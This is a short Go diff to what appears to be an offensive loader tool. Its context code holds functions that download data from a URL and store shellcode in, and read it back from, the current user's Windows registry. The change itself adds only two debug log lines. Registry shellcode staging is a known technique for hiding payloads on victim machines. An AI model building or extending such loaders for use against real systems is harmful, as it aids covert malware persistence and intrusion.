@@ -21,6 +21,7 @@ func DownloadFromURL(url string) ([]byte, error) {
 	return data, nil
 }
 func StoreShellcodeInRegistry(sc []byte, key, name string) error {
+	Debugf("Storing %d bytes at HKCU:\\\\%s\\%s as binary data\n", len(sc), key, name)
 	k, err := registry.OpenKey(registry.CURRENT_USER, key, registry.QUERY_VALUE|registry.SET_VALUE)
 	if err != nil {
 		return errors.New("[!] Failed to open registry key " + err.Error())
@@ -35,6 +36,7 @@ func StoreShellcodeInRegistry(sc []byte, key, name string) error {
 }
 
 func GetShellcodeFromRegistry(key, name string) ([]byte, error) {
+	Debugf("Reading bytes at HKCU:\\\\%s\\%s as binary data\n", key, name)
 	k, err := registry.OpenKey(registry.CURRENT_USER, key, registry.QUERY_VALUE)
 	if err != nil {
 		return nil, errors.New("[!] Failed to open registry key " + err.Error())
